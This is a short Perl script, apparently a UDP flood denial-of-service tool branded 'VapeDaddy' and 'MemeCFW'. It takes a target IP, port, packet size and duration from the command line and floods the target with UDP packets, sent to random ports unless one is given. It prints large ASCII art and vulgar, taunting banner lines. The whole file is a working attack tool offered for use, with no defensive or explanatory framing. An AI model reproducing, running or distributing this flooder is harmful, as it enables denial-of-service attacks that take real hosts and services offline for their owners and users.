#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# VapeDaddy 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

___________________1111111111111__________________
______________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_____________
___________1¶¶¶¶¶¶111111111111111¶¶¶¶¶¶1__________
_________1¶¶¶11111111111111111111111¶1¶¶¶1________
_______1¶¶¶¶1111111111111111111111111111¶¶¶1______
______1¶¶1¶1111111111¶¶¶¶¶¶¶¶1111111111111¶¶1_____
_____¶¶¶11111111¶¶¶¶¶¶¶¶1_¶¶¶¶¶¶¶¶111111111¶¶¶____
____¶¶¶1111111¶¶¶¶¶¶¶¶1_____¶¶¶¶¶¶¶¶11111111¶¶¶___
___1¶¶111111¶¶¶¶¶¶¶¶1_________¶¶¶¶¶¶¶¶1111111¶¶1__
___¶¶11111¶¶¶¶¶¶¶¶1____________1¶¶¶¶¶¶¶¶111111¶¶1_
__¶¶11111¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶1¶¶¶¶¶¶¶¶111111¶¶_
__¶¶1111¶¶¶¶¶¶¶¶_____¶¶¶¶_¶¶_____1¶¶¶¶¶¶¶¶11111¶¶_
__¶¶1111¶¶¶¶¶¶¶1________¶¶________¶¶¶¶¶¶1¶¶1111¶¶_
__¶1111¶¶¶¶¶¶¶¶_______¶¶_¶_¶¶______¶¶¶¶¶¶1¶11111¶_
__¶¶111¶1¶¶¶¶¶¶_______¶¶_¶_¶¶______¶¶¶¶¶¶1¶11111¶_
__¶1111¶¶1¶¶¶¶¶¶________¶¶¶_______1¶¶¶¶¶11¶11111¶_
__¶¶111¶¶1¶¶¶¶¶¶1_____¶¶¶_¶¶______¶¶¶¶¶¶1¶¶1111¶¶_
__1¶¶111¶11¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶_¶¶¶¶¶¶11¶1111¶¶1_
___¶¶¶11¶¶11¶¶¶¶¶¶¶1___________¶¶¶¶¶¶¶11¶¶111¶¶¶__
___1¶¶111¶¶111¶¶¶¶¶¶¶________1¶¶¶¶¶¶111¶¶1111¶¶1__
____1¶¶1111¶¶111¶¶¶¶¶¶¶1___¶¶¶¶¶¶¶111¶¶¶1111¶¶1___
_____1¶¶¶111¶¶¶11111¶¶¶¶¶¶¶¶¶¶11111¶¶¶11111¶¶1____
______1¶¶¶1111¶¶¶¶¶1111¶¶¶11111¶¶¶¶¶11111¶¶¶1_____
________1¶¶111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶1_______
__________¶¶1111111111¶¶¶¶1111111111111¶1_________
__________¶¶¶11111111¶¶11¶¶11111111111¶¶¶_________
________1¶¶11¶1¶¶111111111¶111111¶¶¶¶¶11¶¶________
_______1¶¶111111¶¶¶¶¶1¶1¶¶¶¶¶¶¶¶¶¶1111111¶¶_______
_______¶¶¶11111111111111¶¶11¶1111111111111¶¶______
______1¶1111¶11111111111¶¶11111111111111111¶1_____
______¶¶111¶111111111111¶¶1111111111111¶111¶¶_____
_____1¶111¶¶111111111111¶¶1111111111111¶1111¶1____
_____¶¶¶¶¶¶¶111111111111¶¶1111111111111¶¶¶¶¶¶¶____
____¶¶¶¶¶¶¶¶¶11111111111¶¶111111111111¶¶¶¶¶¶¶¶¶___
____¶¶¶¶¶¶¶¶¶11111111111¶¶111111111111¶¶¶¶¶¶¶¶¶___
____1¶¶¶¶¶¶1111111111111¶¶11111111111111¶¶¶¶¶¶1___
______1111¶1111111111111¶¶11111111111111¶1111_____
__________¶¶¶11111111111¶¶111111111111¶¶¶_________
__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________
________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_______

            * Fuck Fuck Fuckity Fuck *
EOTEXT

print "MemeCFW Just Nulled Your Shit NewGen $ip " . ($port ? $port : "Sucking The Clit") . " With " . 
  ($size ? "$size" : "65500") . "Bots" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
